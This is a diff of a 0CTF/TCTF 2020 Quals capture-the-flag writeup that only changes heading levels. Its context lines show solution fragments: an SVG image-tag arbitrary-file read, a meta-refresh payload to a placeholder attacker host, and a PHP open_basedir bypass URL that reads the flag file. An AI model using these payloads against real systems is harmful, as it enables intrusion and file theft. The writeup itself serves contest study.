@@ -1,6 +1,8 @@
 # 0CTF/TCTF 2020 Quals Writeup
 
-## Misc/Cloud Computing
+## Writeup
+
+### Misc/Cloud Computing
 
 简单fuzz后，选择使用header来绕过并rce
 
@@ -25,7 +27,7 @@ Linux rev 1.0 ext2 filesystem data (mounted or unclean), UUID=d4d08581-e309-4c51
 使用r-studio恢复数据得到flag
 
 
-## babyring
+### babyring
 
 hash碰撞
 
@@ -38,7 +40,7 @@ hash碰撞
 
 找到两个表中相同的元素即可
 
-## emmm
+### emmm
 
 设res文件里的值为 (x_i, y_i)
 
@@ -81,7 +83,7 @@ def decrypt(y,K0,K1):
 
 
 
-## lottery
+### lottery
 ecb重放。16字节一个block，替换前4个block。注意的是，会更换user的前一个byte，因此我们需要找到和我们的目标user第一个byte相同的用户。多开，爆破之。
 ```python=
 import requests
@@ -173,7 +175,7 @@ while 1:
         charge(fakeenc)
 ```
 
-## Wechat Generator
+### Wechat Generator
 
 在svg转换为png图片的时候，可以向svg中插入image标签来读取任意文件，读取app.py得到secret路由
 ![](https://i.imgur.com/BuvddkK.png)
@@ -186,7 +188,7 @@ while 1:
 
 `<memetata name="language" content="0;http://vps/a.html" http-equiv="refresh"" />`
 
-## Happy_tree
+### Happy_tree
 整个程序的执行逻辑存储在一个树状的结构中（多叉树），其中每个节点的结构体如下所示：
 ```cpp=
 struct tree_node{
@@ -251,7 +253,7 @@ for x in check:
 print ans
 ```
 
-## Simple Curve
+### Simple Curve
 
 We implemented this attack method https://www.math.uwaterloo.ca/~ajmeneze/publications/hyperelliptic.pdf
 
@@ -298,7 +300,7 @@ print "flag{" + hex(t2[0].roots()[0][0].integer_representation())[2:-1].decode("
 ```
 
 
-## pyaucalc
+### pyaucalc
 
 builtins 可以通过 subclasses 搞出来，然后字节码搞出任意读写过 audit 就 ok 了。
 
@@ -468,7 +470,7 @@ send_code()
 
 ```
 
-## noeasyphp
+### noeasyphp
 
 利用 `FFI::cast` 类型混淆搞个任意读，然后读 ffi 结构体里的 symbols。
 
@@ -609,7 +611,7 @@ if __name__ == "__main__":
     main()
 ```
 
-## easyphp
+### easyphp
 
 列目录，看到/flag,so
 `$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');};`
@@ -620,7 +622,7 @@ if __name__ == "__main__":
 `http://pwnable.org:19260/?rh=mkdir('/tmp/w1nd'); chdir('/tmp/w1nd'); ini_set('open_basedir','..'); chdir('..'); chdir('..'); chdir('..'); chdir('..'); chdir('..'); ini_set('open_basedir','/'); echo "open_basedir:".ini_get('open_basedir')."\n"; print_r(scandir('..')); echo file_get_contents("php://filter/convert.base64-encode/resource=/flag.so"); `
 ![](https://i.imgur.com/0A6Woax.png)
 
-## Duet
+### Duet
 ```python=3
 from pwn import *
 
@@ -825,7 +827,7 @@ while True:
         continue
 ```
 
-## eeemoji
+### eeemoji
 ```python=2
 from pwn import *
 
@@ -926,7 +928,7 @@ Edit(payload)
 irt()
 ```
 
-## eeeeeemoji
+### eeeeeemoji
 ```python=2
 from pwn import *
 
@@ -1051,7 +1053,7 @@ Edit(payload)
 irt()
 ```
 
-## chromium rce
+### chromium rce
 
 ```javascript=
 const hex = (x) => ("0x" + x.toString(16));
@@ -1092,7 +1094,7 @@ for (let i = 0; i < 8; i++) {
 new ArrayBuffer(0);
 ```
 
-## Chromium SBX
+### Chromium SBX
 
 ```htmlmixed=
 <!DOCTYPE html>
@@ -1228,7 +1230,7 @@ main();
 </html>
 ```
 
-## flash-1
+### flash-1
 ```python=
 from struct import pack
 
@@ -1596,7 +1598,7 @@ print(s[::-1])
 
 ```
 
-## j
+### j
 
 ```python=
 
@@ -1747,7 +1749,7 @@ for j in range(0, 8, 2):
 print(s)
 ```
 
-## w
+### w
 ```python=
 
 
@@ -1799,7 +1801,7 @@ p = 22229
 q = 227081
 ```
 
-## babymips
+### babymips
 
 
 逆完了是个数独
